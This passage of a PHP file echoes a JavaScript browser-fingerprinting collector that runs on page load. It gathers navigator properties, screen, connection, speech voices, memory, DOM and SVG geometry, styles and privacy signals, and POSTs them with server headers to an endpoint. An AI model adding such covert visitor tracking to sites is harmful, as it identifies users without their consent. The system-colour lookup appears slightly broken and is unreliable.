echo "    data.cssMediaExtra = {touchDevice: ('ontouchstart' in window), screenQuery: screen.width+'x'+screen.height, monochrome: 0, dynamicRange: window.matchMedia('(dynamic-range: high)').matches ? 'high' : 'standard'};\n";
echo "    try { data.cssMediaExtra.monochrome = window.matchMedia('(monochrome: 1)').matches ? true : false; } catch(e){}\n";
echo "\n";
echo "    /* ---- Connection ---- */\n";
echo "    data.connection = null;\n";
echo "    try { var c = nav.connection || nav.mozConnection || nav.webkitConnection; if (c){data.connection={effectiveType:c.effectiveType||'',rtt:c.rtt||0,downlink:c.downlink||0,saveData:c.saveData||false};} } catch(e){}\n";
echo "\n";
echo "    /* ---- Speech voices ---- */\n";
echo "    data.speechVoices = [];\n";
echo "    try { var voices = window.speechSynthesis ? window.speechSynthesis.getVoices() : []; voices.forEach(function(v){data.speechVoices.push(v.name+' ['+v.lang+']'+(v.default?' *':''));}); } catch(e){}\n";
echo "\n";
echo "    /* ---- jsMemory ---- */\n";
echo "    data.jsMemory = null;\n";
echo "    try { if (performance.memory) data.jsMemory = {usedJSHeapSize: performance.memory.usedJSHeapSize, totalJSHeapSize: performance.memory.totalJSHeapSize, jsHeapSizeLimit: performance.memory.jsHeapSizeLimit}; } catch(e){}\n";
echo "\n";
echo "    /* ---- Error stack ---- */\n";
echo "    data.errorStack = null;\n";
echo "    try { var err = new Error(); data.errorStack = (err.stack || err.stacktrace || '').split('\\n')[0]; } catch(e){}\n";
echo "\n";
echo "    /* ---- DOM Rect ---- */\n";
echo "    data.domRect = null;\n";
echo "    try { var rectEl = document.createElement('div'); rectEl.style.position='absolute'; rectEl.style.top='10px'; document.body.appendChild(rectEl); var rect = rectEl.getBoundingClientRect(); data.domRect = {x: rect.x, y: rect.y, width: rect.width, height: rect.height, top: rect.top, right: rect.right, bottom: rect.bottom, left: rect.left}; document.body.removeChild(rectEl); } catch(e){}\n";
echo "\n";
echo "    /* ---- SVG Rect ---- */\n";
echo "    data.svgRect = null;\n";
echo "    try { var svgNS = 'http://www.w3.org/2000/svg'; var svg = document.createElementNS(svgNS,'svg'); svg.setAttribute('width',100); svg.setAttribute('height',100); var svgR = document.createElementNS(svgNS,'rect'); svgR.setAttribute('width',50); svgR.setAttribute('height',50); svg.appendChild(svgR); document.body.appendChild(svg); var svgRect = svg.getBoundingClientRect(); data.svgRect = {x: svgRect.x||0, y: svgRect.y||0, width: svgRect.width||0, height: svgRect.height||0, top: svgRect.top||0, right: svgRect.right||0, bottom: svgRect.bottom||0, left: svgRect.left||0, textLength: 50}; document.body.removeChild(svg); } catch(e){}\n";
echo "\n";
echo "    /* ---- Computed Style ---- */\n";
echo "    data.computedStyle = null;\n";
echo "    try { var styleEl = document.createElement('div'); styleEl.style.cssText='color:red;font-size:12px;background:#fff;'; document.body.appendChild(styleEl); var cs = window.getComputedStyle(styleEl); var len = cs.length; var hash = ''; for (var si=0; si<len && si<10; si++) { hash += cs[si]+':'+cs.getPropertyValue(cs[si])+';'; } data.computedStyle = {count: len, hash: hash.substring(0,50)}; document.body.removeChild(styleEl); } catch(e){}\n";
echo "\n";
echo "    /* ---- System Colors ---- */\n";
echo "    data.systemColors = null;\n";
echo "    try { var sc = {}; var colors = ['ActiveText','ButtonBorder','ButtonFace','ButtonText','Canvas','CanvasText','Field','FieldText','GrayText','Highlight','HighlightText','LinkText','Mark','MarkText','VisitedText']; var ds = getComputedStyle(document.documentElement); colors.forEach(function(c){ sc[c] = ds.getPropertyValue('color-' + c.toLowerCase().replace(/([A-Z])/g, '-$1').trim()) || ''; }); data.systemColors = sc; } catch(e){}\n";
echo "\n";
echo "    /* ---- GPC ---- */\n";
echo "    data.gpc = (navigator.globalPrivacyControl === true) ? 'supported' : 'unsupported';\n";
echo "\n";
echo "    /* ---- Worker ---- */\n";
echo "    data.worker = null;\n";
echo "    var workerDone = false;\n";
echo "    try { if (typeof Worker !== 'undefined') { var blob = new Blob(['self.postMessage(JSON.stringify({userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,languages:navigator.languages}));']); var wurl = URL.createObjectURL(blob); var w = new Worker(wurl); w.onmessage = function(e){ data.worker = JSON.parse(e.data); workerDone = true; fpSend(); }; w.postMessage('go'); URL.revokeObjectURL(wurl); } } catch(e){}\n";
echo "\n";
echo "    /* ---- Assemble ---- */\n";
echo "    var payload = { headers: serverSide.headers, server: serverSide.server, phpVersion: serverSide.phpVersion, fingerprint: data };\n";
echo "    payload.fingerprint.navigator = {\n";
echo "      platform: data.platform, vendor: data.vendor, appVersion: data.appVersion, product: data.product,\n";
echo "      productSub: data.productSub, vendorSub: data.vendorSub, language: data.language, languages: data.languages,\n";
echo "      hardwareConcurrency: data.hardwareConcurrency, maxTouchPoints: data.maxTouchPoints, cookieEnabled: data.cookieEnabled,\n";
echo "      doNotTrack: data.doNotTrack, webdriver: data.webdriver, pdfViewerEnabled: data.pdfViewerEnabled, userAgent: data.userAgent\n";
echo "    };\n";
echo "    payload.fingerprint.navigatorKeys = data.navigatorKeys;\n";
echo "    payload.fingerprint.windowKeys = { count: data.navigatorKeys.length, hash: (data.navigatorKeys.join('').length & 0xffff).toString(16) };\n";
echo "    delete data.navigatorKeys;\n";
echo "    delete data.platform; delete data.vendor; delete data.appVersion; delete data.product; delete data.productSub; delete data.vendorSub; delete data.language; delete data.languages; delete data.hardwareConcurrency; delete data.maxTouchPoints; delete data.cookieEnabled; delete data.doNotTrack; delete data.webdriver; delete data.pdfViewerEnabled; delete data.userAgent;\n";
echo "\n";
echo "    /* ---- Send ---- */\n";
echo "    function fpSend() { if (workerDone || !window.Worker || typeof Worker === 'undefined') { doFpsend(); } }\n";
echo "    function doFpsend() {\n";
echo "    var xhr = new XMLHttpRequest();\n";
echo "    xhr.open('POST', endpoint, true);\n";
echo "    xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');\n";
echo "    xhr.timeout = timeoutMs;\n";
echo "    xhr.onload = function () { if (window.console) { console.log('[FP] POST status:', xhr.status); } };\n";
echo "    xhr.onerror = function () { if (window.console) { console.error('[FP] POST failed, status:', xhr.status); } };\n";
echo "    xhr.send(JSON.stringify(payload));\n";
echo "    }\n";
echo "    if (typeof Worker === 'undefined') { fpSend(); } else { setTimeout(function(){ if(!workerDone){ fpSend(); } }, 100); }\n";
echo "  }\n";
echo "\n";
echo "  function safeCollect() { try { collect(); } catch (e) { if (window.console) { console.error('[FP] collect error:', e); } } }\n";
echo "  if (document.readyState === 'loading') {\n";
echo "    var done = false;\n";
echo "    document.addEventListener('DOMContentLoaded', function () { if (done) return; done = true; setTimeout(safeCollect, 0); });\n";
echo "  } else {\n";
echo "    setTimeout(safeCollect, 0);\n";
echo "  }\n";
echo "})();\n";
echo "</script>\n";
echo "<!-- /fingerprint_collector.php -->\n";
